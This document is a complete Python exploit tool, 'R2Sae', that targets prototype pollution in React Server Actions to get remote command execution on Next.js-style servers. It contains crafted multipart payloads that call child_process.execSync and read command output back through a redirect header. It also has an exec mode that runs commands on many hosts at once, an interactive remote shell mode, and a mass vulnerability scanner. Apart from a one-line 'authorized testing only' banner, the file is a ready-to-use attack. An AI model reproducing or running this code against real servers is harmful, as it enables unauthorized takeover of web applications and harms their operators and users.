#!/usr/bin/env python3
"""
R2Sae (React2Shell Auto-Exploit)
A CLI tool to exploit prototype pollution in React Server Actions
"""

import argparse
import sys
import re
import json
import csv
from urllib.parse import unquote
from datetime import datetime
import requests

# Global flag for colors
_colors_enabled = True

class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    
    @staticmethod
    def disable():
        """Disable all colors"""
        global _colors_enabled
        _colors_enabled = False
        Colors.HEADER = ''
        Colors.OKBLUE = ''
        Colors.OKCYAN = ''
        Colors.OKGREEN = ''
        Colors.WARNING = ''
        Colors.FAIL = ''
        Colors.ENDC = ''
        Colors.BOLD = ''
        Colors.UNDERLINE = ''
    
    @staticmethod
    def enable():
        """Enable all colors"""
        global _colors_enabled
        _colors_enabled = True
        Colors.HEADER = '\033[95m'
        Colors.OKBLUE = '\033[94m'
        Colors.OKCYAN = '\033[96m'
        Colors.OKGREEN = '\033[92m'
        Colors.WARNING = '\033[93m'
        Colors.FAIL = '\033[91m'
        Colors.ENDC = '\033[0m'
        Colors.BOLD = '\033[1m'
        Colors.UNDERLINE = '\033[4m'

def print_banner():
    banner = f"""{Colors.OKCYAN}
    ██████╗ ██████╗ ███████╗ █████╗ ███████╗
    ██╔══██╗╚════██╗██╔════╝██╔══██╗██╔════╝
    ██████╔╝ █████╔╝███████╗███████║█████╗  
    ██╔══██╗██╔═══╝ ╚════██║██╔══██║██╔══╝  
    ██║  ██║███████╗███████║██║  ██║███████╗
    ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝
    {Colors.ENDC}{Colors.BOLD}React2Shell Auto-Exploit{Colors.ENDC}
    {Colors.WARNING}⚠ For authorized testing only ⚠{Colors.ENDC}
    """
    print(banner)

def build_exploit_payload(command, read_output=True):
    """
    Build the multipart form data payload for exploitation.
    Returns (body, content_type) tuple.
    """
    boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
    
    if read_output:
        # Build redirect payload that captures output
        prefix_payload = (
            f"var res=process.mainModule.require('child_process').execSync('{command}')"
            f".toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),"
            f"{{digest: `NEXT_REDIRECT;push;/login?a=${{res}};307;`}});"
        )
        
        # Build part0 as JSON string (not parsed) - same as loc.py
        part0 = (
            '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
            '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"'
            + prefix_payload
            + '","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}'
        )
        
        # Build multipart body with field "2" containing [] (required for redirect)
        body = (
            f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
            f'Content-Disposition: form-data; name="0"\r\n\r\n'
            f"{part0}\r\n"
            f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
            f'Content-Disposition: form-data; name="1"\r\n\r\n'
            f'"$@0"\r\n'
            f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
            f'Content-Disposition: form-data; name="2"\r\n\r\n'
            f"[]\r\n"
            f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad--"
        )
    else:
        # Build simple payload without redirect (no output capture)
        prefix_payload = (
            f"process.mainModule.require('child_process').execSync('{command}');"
        )
        
        part0 = (
            '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
            '"value":"{\\"then\\":\\"$B0\\"}","_response":{"_prefix":"'
            + prefix_payload
            + '","_formData":{"get":"$1:constructor:constructor"}}}'
        )
        
        body = (
            f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
            f'Content-Disposition: form-data; name="0"\r\n\r\n'
            f"{part0}\r\n"
            f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
            f'Content-Disposition: form-data; name="1"\r\n\r\n'
            f'"$@0"\r\n'
            f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad--"
        )
    
    content_type = f"multipart/form-data; boundary={boundary}"
    return body, content_type

def build_expression_payload(expression):
    """
    Build a passive payload that evaluates a JavaScript expression.
    Used for vulnerability detection without executing system commands.
    Returns (body, content_type) tuple.
    """
    boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
    
    # Build redirect payload that captures expression result
    prefix_payload = (
        f"var res=String({expression});"
        f"throw Object.assign(new Error('NEXT_REDIRECT'),"
        f"{{digest: `NEXT_REDIRECT;push;/login?a=${{res}};307;`}});"
    )
    
    # Build part0 as JSON string (not parsed)
    part0 = (
        '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
        '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"'
        + prefix_payload
        + '","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}'
    )
    
    # Build multipart body with field "2" containing [] (required for redirect)
    body = (
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="0"\r\n\r\n'
        f"{part0}\r\n"
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="1"\r\n\r\n'
        f'"$@0"\r\n'
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="2"\r\n\r\n'
        f"[]\r\n"
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad--"
    )
    
    content_type = f"multipart/form-data; boundary={boundary}"
    return body, content_type

def extract_output_from_redirect(response):
    """Extract command output from X-Action-Redirect header"""
    redirect_header = response.headers.get("X-Action-Redirect", "")
    
    # Pattern to match: /login?a=<output> (same as loc.py)
    match = re.search(r'/login\?a=([^;]+)', redirect_header)
    
    if match:
        output = match.group(1)
        # URL decode the output
        try:
            decoded_output = unquote(output)
            return decoded_output
        except:
            return output
    
    return None

def execute_exploit(target_url, command, verbose=False, read_output=True):
    """
    Execute the exploit against the target and return the result.
    Returns: (success: bool, output: str | None, error: str | None)
    """
    if verbose:
        print(f"{Colors.OKBLUE}[*] Target: {target_url}{Colors.ENDC}")
        print(f"{Colors.OKBLUE}[*] Command: {command}{Colors.ENDC}")
        print(f"{Colors.OKBLUE}[*] Crafting payload...{Colors.ENDC}")
    
    # Build multipart payload (no temp files needed)
    body, content_type = build_exploit_payload(command, read_output=read_output)
    
    if verbose:
        print(f"{Colors.OKBLUE}[*] Sending exploit...{Colors.ENDC}")
        # Show a snippet of the payload
        payload_preview = body[:300] + "..." if len(body) > 300 else body
        print(f"{Colors.OKBLUE}[*] Payload preview:{Colors.ENDC}")
        print(payload_preview)
    
    # Headers
    headers = {
        'Next-Action': 'dontcare',
        'Content-Type': content_type
    }
    
    try:
        # Encode body as bytes and send
        body_bytes = body.encode('utf-8') if isinstance(body, str) else body
        response = requests.post(
            target_url,
            headers=headers,
            data=body_bytes,
            timeout=10,
            allow_redirects=False
        )
        
        if verbose:
            print(f"{Colors.OKGREEN}[+] Request sent (status: {response.status_code}){Colors.ENDC}")
        
        # Try to extract output from redirect header
        if read_output:
            output = extract_output_from_redirect(response)
            
            if output:
                return True, output, None
            else:
                error_msg = "No output captured in redirect header"
                if verbose:
                    error_msg += f"\n{Colors.OKBLUE}[*] X-Action-Redirect: {response.headers.get('X-Action-Redirect', 'Not present')}{Colors.ENDC}"
                    error_msg += f"\n{Colors.OKBLUE}[*] Response body: {response.text[:500]}{Colors.ENDC}"
                return False, None, error_msg
        else:
            return True, None, None
            
    except requests.exceptions.Timeout:
        error_msg = "Request timed out"
        if verbose:
            error_msg = f"{Colors.WARNING}[!] Request timed out{Colors.ENDC}"
        return False, None, error_msg
    except requests.exceptions.RequestException as e:
        error_msg = f"Request failed: {e}"
        if verbose:
            error_msg = f"{Colors.WARNING}[!] Request failed: {e}{Colors.ENDC}"
        return False, None, error_msg

def execute_expression(target_url, expression, verbose=False):
    """
    Execute an expression evaluation payload (passive scan).
    Returns: (success: bool, output: str | None, error: str | None)
    """
    if verbose:
        print(f"{Colors.OKBLUE}[*] Target: {target_url}{Colors.ENDC}")
        print(f"{Colors.OKBLUE}[*] Expression: {expression}{Colors.ENDC}")
        print(f"{Colors.OKBLUE}[*] Crafting passive payload...{Colors.ENDC}")
    
    # Build expression evaluation payload
    body, content_type = build_expression_payload(expression)
    
    if verbose:
        print(f"{Colors.OKBLUE}[*] Sending payload...{Colors.ENDC}")
    
    # Headers
    headers = {
        'Next-Action': 'dontcare',
        'Content-Type': content_type
    }
    
    try:
        # Encode body as bytes and send
        body_bytes = body.encode('utf-8') if isinstance(body, str) else body
        response = requests.post(
            target_url,
            headers=headers,
            data=body_bytes,
            timeout=10,
            allow_redirects=False
        )
        
        if verbose:
            print(f"{Colors.OKGREEN}[+] Request sent (status: {response.status_code}){Colors.ENDC}")
        
        # Try to extract output from redirect header
        output = extract_output_from_redirect(response)
        
        if output:
            return True, output, None
        else:
            error_msg = "No output captured in redirect header"
            if verbose:
                error_msg += f"\n{Colors.OKBLUE}[*] X-Action-Redirect: {response.headers.get('X-Action-Redirect', 'Not present')}{Colors.ENDC}"
            return False, None, error_msg
            
    except requests.exceptions.Timeout:
        error_msg = "Request timed out"
        if verbose:
            error_msg = f"{Colors.WARNING}[!] Request timed out{Colors.ENDC}"
        return False, None, error_msg
    except requests.exceptions.RequestException as e:
        error_msg = f"Request failed: {e}"
        if verbose:
            error_msg = f"{Colors.WARNING}[!] Request failed: {e}{Colors.ENDC}"
        return False, None, error_msg

def scan_host(target_url, active=False, verbose=False):
    """
    Scan a host for vulnerability.
    Returns: (is_vulnerable: bool, method: str, output: str | None)
    """
    if active:
        # Active scan: try to execute "id" command
        if verbose:
            print(f"{Colors.OKBLUE}[*] Performing active scan (shell method)...{Colors.ENDC}")
        success, output, error = execute_exploit(target_url, "id", verbose=verbose, read_output=True)
        
        if success and output:
            # Check if output looks like id command result (contains uid=, gid=, etc.)
            if "uid=" in output.lower() or "gid=" in output.lower():
                return True, "shell", output
            return False, "shell", None
        return False, "shell", None
    else:
        # Passive scan: evaluate a mathematical expression
        if verbose:
            print(f"{Colors.OKBLUE}[*] Performing passive scan (expression method)...{Colors.ENDC}")
        
        # Use a simple expression that should return a predictable result
        test_expression = "1337 + 42"
        expected_result = "1379"
        
        success, output, error = execute_expression(target_url, test_expression, verbose=verbose)
        
        if success and output:
            # Check if the result matches expected value
            if output.strip() == expected_result:
                return True, "expr", output
            # Also check if we got any numeric result (vulnerable but different expression)
            try:
                int(output.strip())
                return True, "expr", output
            except:
                pass
        
        return False, "expr", None

def validate_url(url):
    """Validate that URL starts with http:// or https://"""
    if not url.startswith(('http://', 'https://')):
        return False
    return True

def format_output_json(results, command=None):
    """Format results as JSON"""
    output_data = {
        'timestamp': datetime.now().isoformat(),
        'command': command,
        'results': []
    }
    
    if not results:
        return json.dumps(output_data, indent=2)
    
    first = results[0]
    if len(first) == 4:
        is_exec_format = False
        if isinstance(first[1], bool):
            if first[3] is not None or (first[2] is not None and isinstance(first[2], str)):
                if first[2] in ('expr', 'shell', 'invalid_url') or (isinstance(first[2], str) and len(first[2]) < 20):
                    # Likely scan format
                    is_exec_format = False
                else:
                    # Likely exec format
                    is_exec_format = True
        
        if is_exec_format:
            for item in results:
                if len(item) == 4:
                    host, success, output, error = item
                    output_data['results'].append({
                        'host': host,
                        'success': success,
                        'output': output,
                        'error': error
                    })
        else:
            # scan format
            for item in results:
                if len(item) == 4:
                    host, is_vuln, method, output = item
                    output_data['results'].append({
                        'host': host,
                        'vulnerable': is_vuln,
                        'method': method,
                        'output': output
                    })
    
    return json.dumps(output_data, indent=2)

def format_output_csv(results, command=None):
    """Format results as CSV"""
    import io
    output = io.StringIO()
    
    if not results:
        return ""
    
    first = results[0]
    if len(first) == 4:
        # Detect format similar to JSON
        is_exec_format = False
        if isinstance(first[1], bool):
            if first[2] in ('expr', 'shell', 'invalid_url') or (isinstance(first[2], str) and len(first[2]) < 20):
                is_exec_format = False
            else:
                is_exec_format = True
        
        writer = csv.writer(output)
        if is_exec_format:
            writer.writerow(['host', 'success', 'output', 'error'])
            for item in results:
                if len(item) == 4:
                    host, success, output_val, error = item
                    writer.writerow([host, success, output_val or '', error or ''])
        else:
            writer.writerow(['host', 'vulnerable', 'method', 'output'])
            for item in results:
                if len(item) == 4:
                    host, is_vuln, method, output_val = item
                    writer.writerow([host, is_vuln, method or '', output_val or ''])
    
    return output.getvalue()

def format_output_txt(results, command=None):
    """Format results as plain text"""
    lines = []
    if command:
        lines.append(f"Command: {command}")
        lines.append("")
    
    if not results:
        return "\n".join(lines)
    
    first = results[0]
    if len(first) == 4:
        # Detect format
        is_exec_format = False
        if isinstance(first[1], bool):
            if first[2] in ('expr', 'shell', 'invalid_url') or (isinstance(first[2], str) and len(first[2]) < 20):
                is_exec_format = False
            else:
                is_exec_format = True
        
        for item in results:
            if len(item) == 4:
                if is_exec_format:
                    host, success, output, error = item
                    lines.append(f"Host: {host}")
                    lines.append(f"Success: {success}")
                    if output:
                        lines.append(f"Output: {output}")
                    if error:
                        lines.append(f"Error: {error}")
                    lines.append("")
                else:
                    host, is_vuln, method, output = item
                    lines.append(f"Host: {host}")
                    lines.append(f"Vulnerable: {is_vuln}")
                    if method:
                        lines.append(f"Method: {method}")
                    if output:
                        lines.append(f"Output: {output}")
                    lines.append("")
    
    return "\n".join(lines)

def save_output(data, filename, format_type='txt'):
    """Save output to file"""
    try:
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(data)
        return True
    except Exception as e:
        print(f"{Colors.FAIL}[!] Error saving output: {e}{Colors.ENDC}")
        return False

def cmd_exec(hosts, command_str, verbose=False, no_output=False, output_file=None, output_format='txt'):
    """Execute command on multiple hosts"""
    # Validate hosts first
    valid_hosts = []
    for host in hosts:
        if not validate_url(host):
            print(f"{Colors.FAIL}[!] Error: Invalid URL: {host}{Colors.ENDC}")
            continue
        valid_hosts.append(host)
    
    if not valid_hosts:
        return
    
    # Show all "Executing on" messages first
    print()
    for host in valid_hosts:
        print(f"{Colors.OKCYAN}[*] Executing on: {host}{Colors.ENDC}")
    
    print()  # Empty line before results
    
    # Execute all exploits and collect results
    results = []
    for host in valid_hosts:
        success, output, error = execute_exploit(host, command_str, verbose=False, read_output=not no_output)
        results.append((host, success, output, error))
    
    # Display all results
    for host, success, output, error in results:
        if success:
            if not no_output and output:
                # Format output in a single line, truncate if too long
                output_line = output.replace('\n', ' ').replace('\r', '').strip()
                if len(output_line) > 100:
                    output_line = output_line[:97] + "..."
                print(f"{Colors.OKGREEN}(Out) {Colors.WARNING}{host}{Colors.ENDC}: {output_line}")
            elif no_output:
                print(f"{Colors.OKGREEN}(Out) {Colors.WARNING}{host}{Colors.ENDC}: Command executed successfully")
            else:
                print(f"{Colors.FAIL}(Err) {Colors.WARNING}{host}{Colors.ENDC}: No output captured")
        else:
            if error:
                if "timed out" in error.lower():
                    print(f"{Colors.OKGREEN}(Out) {Colors.WARNING}{host}{Colors.ENDC}: Command executed (timeout expected)")
                else:
                    # Format error in a single line
                    error_line = error.replace('\n', ' ').replace('\r', '').strip()
                    if len(error_line) > 100:
                        error_line = error_line[:97] + "..."
                    print(f"{Colors.FAIL}(Err) {Colors.WARNING}{host}{Colors.ENDC}: {Colors.FAIL}{error_line}{Colors.ENDC}")
            else:
                print(f"{Colors.FAIL}(Err) {Colors.WARNING}{host}{Colors.ENDC}: Failed to execute command")
    
    # Save to file if specified
    if output_file:
        if output_format == 'json':
            formatted = format_output_json(results, command_str)
        elif output_format == 'csv':
            formatted = format_output_csv(results, command_str)
        else:  # txt
            formatted = format_output_txt(results, command_str)
        
        if save_output(formatted, output_file, output_format):
            print(f"\n{Colors.OKGREEN}[+] Results saved to {output_file}{Colors.ENDC}")

def cmd_shell(hosts, verbose=False):
    """Interactive shell mode (supports multiple hosts)"""
    if not hosts:
        print(f"{Colors.FAIL}[!] Error: At least one host required{Colors.ENDC}")
        return
    
    # Validate all hosts
    valid_hosts = []
    for host in hosts:
        if not validate_url(host):
            print(f"{Colors.FAIL}[!] Error: Invalid URL: {host}{Colors.ENDC}")
            continue
        valid_hosts.append(host)
    
    if not valid_hosts:
        return
    
    # Show active hosts
    print(f"{Colors.OKCYAN}[*] Interactive mode enabled{Colors.ENDC}")
    if len(valid_hosts) == 1:
        print(f"{Colors.OKCYAN}[*] Target: {valid_hosts[0]}{Colors.ENDC}")
    else:
        print(f"{Colors.OKCYAN}[*] Targets: {', '.join(valid_hosts)}{Colors.ENDC}")
    print(f"{Colors.OKCYAN}[*] Type 'exit' or 'quit' to exit{Colors.ENDC}\n")
    
    while True:
        try:
            # Get command from user
            command = input(f"{Colors.OKGREEN}Shell:{Colors.ENDC} ").strip()
            
            # Check for exit commands
            if command.lower() in ('exit', 'quit', 'q'):
                print(f"{Colors.OKCYAN}[*] Exiting...{Colors.ENDC}")
                break
            
            # Skip empty commands
            if not command:
                continue
            
            # Execute exploit on all hosts
            results = []
            for host in valid_hosts:
                success, output, error = execute_exploit(host, command, verbose=False, read_output=True)
                results.append((host, success, output, error))
            
            # Display results
            for host, success, output, error in results:
                if success and output:
                    print(f"{Colors.OKGREEN}>{Colors.ENDC} ({Colors.WARNING}{host}{Colors.ENDC}) {output}")
                elif error:
                    if "timed out" in error.lower():
                        print(f"{Colors.OKGREEN}>{Colors.ENDC} ({Colors.WARNING}{host}{Colors.ENDC}) Command executed (timeout expected)")
                    else:
                        print(f"{Colors.FAIL}>{Colors.ENDC} ({Colors.WARNING}{host}{Colors.ENDC}) {Colors.FAIL}{error}{Colors.ENDC}")
                else:
                    print(f"{Colors.FAIL}>{Colors.ENDC} ({Colors.WARNING}{host}{Colors.ENDC}) {Colors.FAIL}No output received{Colors.ENDC}")
            
            print()  # Empty line for readability
            
        except KeyboardInterrupt:
            print(f"\n{Colors.WARNING}[!] Interrupted by user{Colors.ENDC}")
            break
        except EOFError:
            print(f"\n{Colors.OKCYAN}[*] Exiting...{Colors.ENDC}")
            break

def cmd_scan(hosts, active=False, verbose=False, output_file=None, output_format='txt'):
    """Scan multiple hosts for vulnerability"""
    results = []
    
    for host in hosts:
        if not validate_url(host):
            print(f"{Colors.FAIL}[!] Error: Invalid URL: {host}{Colors.ENDC}")
            results.append((host, False, "invalid_url", None))
            continue
        
        print(f"\n{Colors.OKCYAN}[*] Scanning: {host}{Colors.ENDC}")
        is_vulnerable, method, output = scan_host(host, active=active, verbose=verbose)
        
        if is_vulnerable:
            print(f"{Colors.OKGREEN}[+] VULNERABLE ({method} method){Colors.ENDC}")
            if output:
                print(f"{Colors.OKGREEN}[+] Result: {output[:100]}{Colors.ENDC}")
            results.append((host, True, method, output))
        else:
            print(f"{Colors.FAIL}[-] NOT VULNERABLE{Colors.ENDC}")
            results.append((host, False, method, None))
    
    # Summary
    print(f"\n{Colors.BOLD}{'='*60}{Colors.ENDC}")
    print(f"{Colors.BOLD}Scan Summary:{Colors.ENDC}")
    print(f"{Colors.BOLD}{'='*60}{Colors.ENDC}")
    
    vulnerable_count = sum(1 for _, vuln, _, _ in results if vuln)
    total_count = len(results)
    
    for host, is_vuln, method, output in results:
        status = f"{Colors.OKGREEN}VULNERABLE{Colors.ENDC}" if is_vuln else f"{Colors.FAIL}NOT VULNERABLE{Colors.ENDC}"
        method_str = f" ({method})" if method else ""
        print(f"  {host}: {status}{method_str}")
    
    print(f"\n{Colors.BOLD}Total: {vulnerable_count}/{total_count} vulnerable{Colors.ENDC}")
    
    # Save to file if specified
    if output_file:
        if output_format == 'json':
            formatted = format_output_json(results)
        elif output_format == 'csv':
            formatted = format_output_csv(results)
        else:  # txt
            formatted = format_output_txt(results)
        
        if save_output(formatted, output_file, output_format):
            print(f"\n{Colors.OKGREEN}[+] Results saved to {output_file}{Colors.ENDC}")

def main():
    parser = argparse.ArgumentParser(
        description='R2Sae - React2Shell Auto-Exploit Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  %(prog)s exec http://localhost:3000 -c whoami
  %(prog)s exec http://target.com http://target2.com -c "id" -v
  %(prog)s shell http://localhost:3000
  %(prog)s scan http://target.com
  %(prog)s scan http://target.com --active
        '''
    )
    
    parser.add_argument('--no-banner', action='store_true', help='Suppress banner')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('-n', '--no-colors', action='store_true', help='Disable colored output')
    parser.add_argument('-o', '--output', dest='output_file', help='Save results to file')
    parser.add_argument('-f', '--output-format', dest='output_format', choices=['json', 'csv', 'txt'], default='txt', help='Output format (default: txt)')
    
    subparsers = parser.add_subparsers(dest='command', help='Command to execute')
    
    # exec subcommand
    exec_parser = subparsers.add_parser('exec', help='Execute a command on target host(s)')
    exec_parser.add_argument('hosts', nargs='+', help='Target URL(s) (e.g., http://localhost:3000)')
    exec_parser.add_argument('-c', '--command', dest='cmd', required=True, help='Command to execute on target')
    exec_parser.add_argument('--no-output', action='store_true', help='Do not attempt to read command output')
    
    # shell subcommand
    shell_parser = subparsers.add_parser('shell', help='Interactive shell mode')
    shell_parser.add_argument('hosts', nargs='+', help='Target URL (first host will be used)')
    
    # scan subcommand
    scan_parser = subparsers.add_parser('scan', help='Scan host(s) for vulnerability')
    scan_parser.add_argument('hosts', nargs='+', help='Target URL(s) to scan')
    scan_parser.add_argument('--active', action='store_true', help='Use active scan method (shell) instead of passive (expression)')
    
    args = parser.parse_args()
    
    if not args.command:
        parser.print_help()
        sys.exit(1)
    
    # Disable colors if requested
    if getattr(args, 'no_colors', False):
        Colors.disable()
    
    if not args.no_banner:
        print_banner()
    
    # Get output options
    output_file = getattr(args, 'output_file', None)
    output_format = getattr(args, 'output_format', 'txt')
    
    try:
        if args.command == 'exec':
            cmd_exec(args.hosts, args.cmd, args.verbose, getattr(args, 'no_output', False), output_file, output_format)
        elif args.command == 'shell':
            cmd_shell(args.hosts, args.verbose, output_file, output_format)
        elif args.command == 'scan':
            cmd_scan(args.hosts, active=getattr(args, 'active', False), verbose=args.verbose, output_file=output_file, output_format=output_format)
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}[!] Interrupted by user{Colors.ENDC}")
        sys.exit(1)
    except Exception as e:
        print(f"{Colors.FAIL}[!] Error: {e}{Colors.ENDC}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)

if __name__ == '__main__':
    main()
